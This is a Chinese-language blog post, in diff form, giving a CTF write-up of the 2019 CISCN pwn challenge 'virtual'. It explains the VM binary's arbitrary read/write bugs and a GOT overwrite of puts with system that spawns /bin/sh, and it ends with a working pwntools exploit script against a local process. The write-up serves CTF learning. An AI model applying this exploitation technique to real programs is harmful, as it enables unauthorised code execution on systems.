@@ -1,0 +1,137 @@
+---
+layout: post
+title:  "2019.4.25 2019 ciscn 国赛 pwn virtual"
+tags: [ROP, pwn, vm, stack]
+date: 2019-04-25
+comments: false
+---
+
+# 2019CISCN国赛一道比较有意思的pwn-virtual
+
+上周末打了国赛，主要做了pwn，一共六个，除了最后一道virtual其他的都还蛮常规的，也不算难。
+
+记录一下virtual的解题过程。  
+
+checksec:
+
+![5cc10c4602242](https://i.loli.net/2019/04/25/5cc10c4602242.png)
+
+![5cc10d2fe94f2](https://i.loli.net/2019/04/25/5cc10d2fe94f2.png)
+
+程序模拟了三个栈，分别是数据栈，指令栈和运行栈。(三个栈实际都在堆上)
+
+先输入指令，将它们放到指令栈中。再输入数据，将他们放到了数据栈中。
+
+再进入op函数，依照指令栈中的指令，将数据栈中的数据放到运行栈中，对数据做操作。
+
+如：指令栈中存了push push add pop
+
+数据栈中存了1 2
+
+op()函数会先将1压入运行栈，再将2压入运行栈，然后执行1+2，接着将结果pop到数据栈中。此时运行栈为空，数据栈只剩下3了。最后使用show()函数打印出数据栈中的数据，也就是3。
+
+程序支持的所有指令有：push pop add sub mul div load save
+
+漏洞在load指令与save指令。
+
+load:
+
+![5cc10eb06432e](https://i.loli.net/2019/04/25/5cc10eb06432e.png)
+
+可以做到任意读，具体偏移是用ida动态调试出来的。
+
+save:
+
+![5cc10f4671fd9](https://i.loli.net/2019/04/25/5cc10f4671fd9.png)
+
+可以做到任意写，偏移同样需要调试。
+
+先说一下getshell思路，可以看到程序开头输入了name，最后puts(name)，got表可写。
+
+因此可以输入name = /bin/sh ， 劫持puts@got为system地址。
+
+便会执行system("/bin/sh")从而拿到shell。
+
+可以首先通过save函数读取到puts@got中的值，即puts函数的真实地址。然后通过add函数，加上其与system函数的固定偏移值。这时的地址已经变成了system函数的真实地址。再通过save函数，将system函数的地址写到puts@got即可。  
+
+动态调试：
+
+指令：push load
+
+数据：0
+
+断在load函数里面刚刚执行完mov rax,[rax\]就可以。
+
+![5cc111b5213ba](https://i.loli.net/2019/04/25/5cc111b5213ba.png)
+
+查看rax:
+
+![5cc111c9726da](https://i.loli.net/2019/04/25/5cc111c9726da.png)
+
+可以看到输入偏移0，load出来的数据是0x211。
+
+找一下0x211是哪里的数据。
+
+查看位于堆上的数据栈。
+
+![5cc1121635126](https://i.loli.net/2019/04/25/5cc1121635126.png)
+
+位于0x1922058，多测试几次可以发现
+
+输入-1 读取 0x1922050
+
+输入-2 读取 0x1922048
+
+可以得出结论：`0x1922060+(x-1)*8 = addr`，`x = (addr - 0x1922060)/8 + 1`其中x为输入的数据，0x1922060为运行栈的地址。
+
+因此我们要读0x404020(puts@got)的话，首先要知道运行栈的地址。
+
+而从上图可知，运行栈的地址只需要输入-3 load即可(实际上当数据栈中的数据增多以后，不是输入-3，而是-4,-5或更低，可能跟数据栈环境变化有关系，这一点不用太纠结，因为肯定有一个偏移能读到运行栈地址，手动修正即可)。
+
+读出栈地址之后，使用上面的公式，令`addr=0x404020`，即可算出读取puts@got所需要的偏移。
+
+接着load，即可读出puts的真实地址。使用add增加与system的偏移后得到system的真实地址。
+
+这时就让system的真实地址存在运行栈的栈底，接着使用同样的方法再次读出`addr=0x404020`，save 需要的偏移。
+
+这时运行栈中只有两个数据，栈顶为save函数覆写puts@got需要的偏移，栈底为system的真实地址。
+
+执行save，即可向puts@got写入system。
+
+exploit:
+
+```python
+#!/usr/bin/env python
+# -*- coding=utf8 -*-
+"""
+# Author: le3d1ng
+# Created Time : 2019年04月24日 星期三 12时12分43秒
+# File Name: exp.py
+# Description:
+"""
+from pwn import *
+
+io = process('./pwn')
+#elf = ELF('./pwn')
+#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+context.log_level = 'debug'
+context.terminal = ['terminator' , '-x' , 'sh' , '-c']
+
+#print libc.symbols['puts'] - libc.symbols['system']
+# 0x404020 = 4210720
+# offset = -172800
+io.recv()
+io.sendline('/bin/sh')
+
+payload = 'push push load push sub push add div push add load push add push push load push sub push add div push add save'#div pop'# div pop'
+
+
+io.recvuntil('ion:\n')
+io.sendline(payload)
+payload = '8 -4 0 4210720 1 -172800 8 -5 0 4210720 1'
+io.recvuntil('data:\n')
+io.sendline(payload)
+#io.recv()
+io.interactive()
+```
